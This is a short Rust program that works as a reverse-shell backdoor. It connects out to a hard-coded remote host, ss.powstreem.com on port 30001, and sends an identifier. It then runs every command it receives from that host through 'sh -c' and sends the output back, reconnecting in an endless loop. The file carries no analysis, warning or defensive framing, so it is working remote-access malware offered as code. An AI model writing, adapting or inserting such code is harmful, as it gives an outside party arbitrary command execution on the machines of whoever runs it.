use cmd_lib::run_fun;
use tokio::time::sleep;
extern crate rand;
use rand::Rng;
use std::error::Error;
use std::io;
use std::time::Duration;
use tokio::io::Interest;
use tokio::net::TcpStream;
use chrono::prelude::*;
extern crate chrono;
#[tokio::main]
async fn main() {
    loop {
        handle_tcp().await.unwrap();
        sleep(Duration::from_millis(1000)).await;
        println!("reconnect");
    }
    
}

fn get_id() -> String {
    // let macaddr = run("ifconfig");
    let mut rng = rand::thread_rng();
    let n2:i64 = rng.gen();
    let dt = Local::now();
    let utc = dt.timestamp_millis();
    let id = utc.to_string() + &n2.to_string();
    return id;
}
async fn handle_tcp() -> Result<(), Box<dyn Error>> {
    let stream = TcpStream::connect("ss.powstreem.com:30001").await?;
    let ready = stream
        .ready(Interest::READABLE | Interest::WRITABLE)
        .await?;
    if ready.is_writable() {
        let id = get_id();
        // Try to write data, this may still fail with `WouldBlock`
        // if the readiness event is a false positive.
        match stream.try_write(id.as_bytes()) {
            Ok(n) => {
                println!("write {} bytes", n);
            }
            Err(e) => {
                return Err(e.into());
            }
        }
    }
    loop {
        let ready = stream
            .ready(Interest::READABLE | Interest::WRITABLE)
            .await?;

        if ready.is_readable() {
            let mut data = vec![0; 4096];
            // Try to read data, this may still fail with `WouldBlock`
            // if the readiness event is a false positive.
            match stream.try_read(&mut data) {
                Ok(n) => {
                    if n > 0 {
                        println!("read {} bytes", n);
                        let cmd = std::str::from_utf8(&data)
                            .unwrap()
                            .trim_matches(char::from(0));
                        println!("{}", cmd);
                        let out = run(cmd);
                        println!("{}", out);
                        match stream.try_write(out.as_bytes()) {
                            Ok(n) => {
                                println!("write {} bytes", n);
                            }
                            Err(e) => {
                                return Err(e.into());
                            }
                        }
                    }else{
                        break;
                    }
                }
                Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                    continue;
                }
                Err(e) => {
                    return Err(e.into());
                }
            }
        }
        
    }
    Ok(())
    
}
fn run(cmd: &str) -> String {
    let f = run_fun!(sh -c $cmd);
    let out: String;
    match f {
        Ok(msg) => {
            out = msg.trim().to_string();
        }
        Err(err) => {
            out = err.to_string();
        }
    }
    return out;
}
